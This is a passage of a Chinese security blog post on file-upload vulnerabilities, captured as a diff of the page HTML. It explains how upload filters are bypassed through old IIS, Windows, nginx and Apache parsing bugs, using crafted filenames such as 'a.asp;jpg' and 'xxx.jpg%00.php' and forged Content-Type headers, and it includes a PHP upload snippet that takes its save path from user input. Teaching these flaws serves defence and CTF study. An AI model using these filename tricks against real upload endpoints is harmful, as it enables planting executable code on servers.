substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong><br><strong>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</strong></p>
+<p><strong>绕过方法</strong></p>
+<blockquote>
+<p>在一些Web server中，存在解析漏洞:<br><strong>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）<br>5.apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</strong></p>
+</blockquote>
+<h4 id="3-检查Content-Type"><a href="#3-检查Content-Type" class="headerlink" title="3.检查Content-Type"></a>3.检查Content-Type</h4><p><strong>原理</strong></p>
+<p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p>
+<p><strong>常见类型</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件后缀</th>
+<th>Mime类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.flv</td>
+<td>flv/flv-flash</td>
+<td>在线播放</td>
+</tr>
+<tr>
+<td>.html或.htm</td>
+<td>text/html</td>
+<td>超文本标记语言文本</td>
+</tr>
+<tr>
+<td>.rtf</td>
+<td>application/rtf</td>
+<td>RTF文本</td>
+</tr>
+<tr>
+<td>.gif 或.png</td>
+<td>image/gif(image/png)</td>
+<td>GIF图形/PNG图片</td>
+</tr>
+<tr>
+<td>.jpeg或.jpg</td>
+<td>image/jpeg</td>
+<td>JPEG图形</td>
+</tr>
+<tr>
+<td>.au</td>
+<td>audio/basic</td>
+<td>au声音文件</td>
+</tr>
+<tr>
+<td>.mid或.midi</td>
+<td>audio/midi或audio/x-midi</td>
+<td>MIDI音乐文件</td>
+</tr>
+<tr>
+<td>.ra或.ram或.rm</td>
+<td>audio/x-pn-realaudio</td>
+<td>RealAudio音乐文件</td>
+</tr>
+<tr>
+<td>.mpg或.mpeg或.mp3</td>
+<td>video/mpeg</td>
+<td>MPEG文件</td>
+</tr>
+<tr>
+<td>.avi</td>
+<td>video/x-msvideo</td>
+<td>AVI文件</td>
+</tr>
+<tr>
+<td>.gz</td>
+<td>application/x-gzip</td>
+<td>GZIP文件</td>
+</tr>
+<tr>
+<td>.tar</td>
+<td>application/x-tar</td>
+<td>TAR文件</td>
+</tr>
+<tr>
+<td>.exe</td>
+<td>application/octet-stream</td>
+<td>下载文件类型</td>
+</tr>
+<tr>
+<td>.rmvb</td>
+<td>video/vnd.rn-realvideo</td>
+<td>在线播放</td>
+</tr>
+<tr>
+<td>.txt</td>
+<td>text/plain</td>
+<td>普通文本</td>
+</tr>
+<tr>
+<td>.mrp</td>
+<td>application/octet-stream</td>
+<td>MRP文件（国内普遍的手机）</td>
+</tr>
+<tr>
+<td>.ipa</td>
+<td>application/iphone-package-archive</td>
+<td>IPA文件(IPHONE)</td>
+</tr>
+<tr>
+<td>.deb</td>
+<td>application/x-debian-package-archive</td>
+<td>DED文件(IPHONE)</td>
+</tr>
+<tr>
+<td>.apk</td>
+<td>application/vnd.android.package-archive</td>
+<td>APK文件(安卓系统)</td>
+</tr>
+<tr>
+<td>.cab</td>
+<td>application/vnd.cab-com-archive</td>
+<td>CAB文件(Windows Mobile)</td>
+</tr>
+<tr>
+<td>.xap</td>
+<td>application/x-silverlight-app</td>
+<td>XAP文件(Windows Phone 7)</td>
+</tr>
+<tr>
+<td>.sis</td>
+<td>application/vnd.symbian.install-archive</td>
+<td>SIS文件(symbian平台)</td>
+</tr>
+<tr>
+<td>.jar</td>
+<td>application/java-archive</td>
+<td>JAR文件(JAVA平台手机通用格式)</td>
+</tr>
+<tr>
+<td>.jad</td>
+<td>text/vnd.sun.j2me.app-descriptor</td>
+<td>JAD文件(JAVA平台手机通用格式)</td>
+</tr>
+<tr>
+<td>.sisx</td>
+<td>application/vnd.symbian.epoc/x-sisx-app</td>
+<td>SISX文件(symbian平台)</td>
+</tr>
+</tbody></table>
+<p><strong>绕过方法</strong><br>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application/php改为其他web程序允许的类型。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="黄子元 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="黄子元 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>黄子元
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">https://hzy2003628.top/2022/02/05/文件上传/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag"># 文件上传漏洞</a>
+          </div>
+
+        
+
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/04/DVWA%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E7%9A%84%E6%95%99%E7%A8%8B/" rel="prev" title="DVWA">
+      <i class="fa fa-chevron-left"></i> DVWA
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/" rel="next" title="文件上传  上">
+      文件上传  上 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell"><span class="nav-number">1.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%A7%E5%85%A8"><span class="nav-number">2.</span> <span class="nav-text">一句话木马大全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%A7%E7%94%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">3.</span> <span class="nav-text">产生文件上传漏洞的原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">文件上传漏洞的攻击与防御方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">1.前端限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%A3%80%E6%9F%A5%E6%89%A9%E5%B1%95%E5%90%8D"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">2.检查扩展名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E9%BB%91%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5%EF%BC%8C"><span class="nav-number">4.0.0.2.1.</span> <span class="nav-text">1.黑名单策略，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="nav-number">4.0.0.2.2.</span> <span class="nav-text">2.白名单策略</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%A3%80%E6%9F%A5Content-Type"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">3.检查Content-Type</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="黄子元"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">黄子元</p>
+  <div class="site-description" itemprop="description">没有所谓失败，除非你不再尝试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:2596328958@qq.com" title="E-Mail → mailto:2596328958@qq.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+	  
+	  
+	  
+	 
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/" rel="tag">HTTP头部信息分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%B7%A5%E5%85%B7%E5%8C%85/" rel="tag">Web工具包</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/next%E4%B8%BB%E9%A2%98%E5%A4%B1%E6%95%88/" rel="tag">next主题失效</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E3%80%81-%E5%8D%9A%E5%AE%A2%E6%AD%BB%E5%BE%AA%E7%8E%AF%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/" rel="tag">、 - 博客死循环框架问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8D%E8%92%9C%E5%AD%90%E4%B8%8D%E6%98%BE%E7%A4%BA/" rel="tag">不蒜子不显示</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="tag">博客主题优化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="tag">博客部分问题解决方法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" rel="tag">常用指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%95%99%E8%A8%80%E6%9D%BF/" rel="tag">留言板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" rel="tag">评论系统</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+   
+
+   </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003011号 </a>
+      <img src="/images/beian.png" style="display: inline-block;">
+  </div>
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+   </span>
+  <span class="author" itemprop="copyrightHolder">黄子元</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">289k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:22</span>
+</div>
+
+
+
+
+
+
+
+<section class="footer-time">
+    <span class="footer__copyright">
+    <div>
+    <span id="span_dt_dt"> </span>
+    <script language="javascript">
+      function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("12/25/2021 10:56:12");//这个日期是可以修改的
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());//其实仅仅改了这里
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=Math.floor(e_hrsold);
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=Math.floor((e_hrsold-hrsold)*60);
+        seconds=Math.floor((e_minsold-minsold)*60);
+        span_dt_dt.innerHTML="黄子元的博客已经运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+      }
+      show_date_time();
+    </script>
+    </div>
+	
+	
+
+
+
+
+<!--这一段是不蒜子的访问量统计代码-->
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+总访问量<span id="busuanzi_value_site_pv"></span>次 &nbsp;   </span>
+访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+	 
+	 
+	 
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png"align="absmiddle" width="59px" height="30px" /></a>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,225' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'kkHz96fwDwdnhN10VTUS0KUx-gzGzoHsz',
+      appKey     : '3th47KWUKTQ2oX3tNXqz6WQW',
+      placeholder: "来留下你的痕迹吧",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+</html>
+
+
+
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<script type="text/javascript">
+    var OriginTitile=document.title,st;
+	document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ网页崩溃了",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的，别走了！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+</script>
+
+<script type="text/javascript">
+//只在桌面版网页启用特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+<script src="/js/cursor.js"></script>
+
+
